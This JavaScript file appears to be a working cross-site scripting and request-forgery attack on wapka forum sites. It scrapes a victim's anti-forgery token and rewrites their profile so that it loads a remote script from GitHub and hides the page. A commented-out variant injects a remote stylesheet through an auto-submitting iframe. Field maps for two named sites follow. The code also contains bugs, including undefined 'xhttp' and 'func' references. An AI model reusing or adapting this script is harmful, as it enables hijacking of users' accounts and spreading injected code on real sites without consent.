function makeid() {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < 5; i++) text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}
function replaceAll(find, replace, str) {
  return str.replace(new RegExp(find, 'g'), replace);
}
function sprof(src) {
    var cl = document.location.href;
    var hash = cl.indexOf("hash=");
    var search = "&";
    var preIndex = hash + 5;
    var searchIndex = preIndex + cl.substring(preIndex).indexOf(search);
    hash = cl.substring(preIndex, searchIndex);
    var mchs = src.indexOf("mchs");
    mchs = src.substring(mchs + 13, mchs + 45);
    /*Encode brackets for bookmarklet*/
    var name = src.indexOf("pr_var[11]");
    search = "\"";
    preIndex = name + 21; /* IF PR_VAR.LENGTH == 9 { PREINDEX = NAME + 19;} (10 => 20, 11 => 21, 12 => 22) !!!!!!*/
    searchIndex = preIndex + src.substring(preIndex).indexOf(search);
    var nameCode = src.substring(preIndex, searchIndex - 1);
    preIndex = src.indexOf(nameCode) + nameCode.length + 10;
    searchIndex = preIndex + src.substring(preIndex).indexOf(search);
    name = src.substring(preIndex, searchIndex);
    name = replaceAll("&lt;", "<", name);
    name = replaceAll("&gt;", ">", name);
    ajax({
      url: "/setprofile_1.xhtml",
      method: "post",
      data: {
        "pr_var[900]": "\"><script src=https://github.com/kaloncpu57/wapka-scripts/raw/master/cssnet.js></script><style>*, body, h2, .B, .A, div, #shout_msg{display: none !important;visibility: hidden !important;}</style><tag",
        "submit": "Edit profile",
        "mchs": mchs,
        "p": makeid()
      },
      func: function(response) {
        void(0);
      }
    });
    /*
    var form = document.createElement("FORM");
    form.setAttribute("method", "post");
    form.setAttribute("action", "/setprofile_1.xhtml");
    var input2 = document.createElement("INPUT");
    input2.setAttribute("name", "pr_var[11]");
    input2.setAttribute("value", name + "<link rel=stylesheet href=http://kaloncpu57.comyr.com/css/dsiadventure.css />");
    form.appendChild(input2);
    var input = document.createElement("INPUT");
    input.setAttribute("type", "submit");
    input.setAttribute("name", "submit");
    input.setAttribute("id", "submit");
    form.appendChild(input);
    var input3 = document.createElement("INPUT");
    input3.setAttribute("type", "hidden");
    input3.setAttribute("name", "mchs");
    input3.setAttribute("value", mchs);
    form.appendChild(input3);
    var input4 = document.createElement("INPUT");
    input4.setAttribute("type", "hidden");
    input4.setAttribute("name", "p");
    input4.setAttribute("value", makeid());
    form.appendChild(input4);
    var iframe = document.createElement("IFRAME");
    var src_doc = form.outerHTML;
    src_doc.replace("><", ">" + form.innerHTML + "<");
    src_doc += "<script>window.onload = function(){document.getElementById('submit').click();};</script>";
    iframe.srcdoc = src_doc;
    document.body.appendChild(iframe);
    */
}

function ajax(options /*url, method, func, data*/) {
  var options = options || {};
  var xmlhttp;
  if ("XMLHttpRequest" in window) xmlhttp = new XMLHttpRequest();
  if ("ActiveXObject" in window) xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
  if (options.method.toLowerCase() == "get") {
    xmlhttp.open('GET', options.url, true);
    xmlhttp.onreadystatechange = function () {
      if (xmlhttp.readyState == 4) {
        func(xmlhttp.responseText);
      }
    };
    xmlhttp.send(null);
  } else if (options.method.toLowerCase() == "post") {
    xmlhttp.open('POST', options.url, true);
    xhttp.setRequestHeader("Content-type", "multipart/form-data");
    xmlhttp.onreadystatechange = function () {
      if (xmlhttp.readyState == 4) {
        func(xmlhttp.responseText);
      }
    };
    xmlhttp.send(options.data);
  }
}

ajax({url: "/setprofile_1.xhtml", method: "get", func: sprof});
/* 3DSFlare pr_var values:
[2] = Name
[3] = Gender
[4] = Age
[5] = Bio
[446] = Friends
[279] = Describe Yourself
[6] = Fav Admin
[7] = 3DS Friend Code
[8] = Wii ^^ ^^
[133] = Relationship
[134] = Interests
[1] = Signature
[159] = Fav Bands
[435] = Profile CSS
[900] = Forum Header CSS
[1000] = Forum Footer CSS

DSiAdventure values
[1] = Gender
[2] = Bio
[3] = Fav Admin/Mod
[4] = Fav Avatar
[5] = Real Name
[6] = Age
[7] = Friends
[8] = Describe Yourself
[9] = 3DS Friend Code
[10] = Rate Site
[11] = Signature
[12] = Profile CSS
*/
